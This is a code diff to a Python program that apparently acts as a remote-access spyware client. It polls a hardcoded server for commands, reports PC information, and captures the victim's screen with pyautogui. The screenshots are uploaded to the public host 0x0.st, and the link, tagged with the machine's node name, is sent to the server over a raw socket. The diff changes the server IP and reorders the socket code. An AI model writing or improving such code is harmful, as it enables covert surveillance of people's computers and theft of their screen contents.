@@ -4,7 +4,7 @@ from requests import get
 import requests
 import time
 
-ip = '54.79.26.131'  # Server IP
+ip = '127.0.0.1'  # Server IP
 port = 4570  # Server port
 
 # Function to send PC info to the server
@@ -34,6 +34,8 @@ def send_screenshot():
     import pyautogui
     import tempfile
 
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
     # Take screenshot
     screenshot = pyautogui.screenshot()
 
@@ -52,15 +54,19 @@ def send_screenshot():
         response = requests.post('https://0x0.st', headers=headers, files=files)
 
     if response.status_code == 200:
-        screenshot = ":SCREENSHOT\n" + response.text.strip()
+        system_info = platform.uname()
+        node_name = system_info.node
+        link = response.text.strip()
+        screenshot = f":SCREENSHOT\n{node_name}\n{link}"
+        s.send(screenshot.encode())  # Send screenshot in lines
+        s.close()  # Close the connection
+
     else:
         print("Upload failed:", response.text)
+        s.close()  # Close the connection
     
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, port))
-    s.send(screenshot.encode())  # Send screenshot in lines
-    s.close()  # Close the connection
-
+    
+    
 # Main function to constantly check the server for commands
 def main():
     system_info = platform.uname()  # Get system info
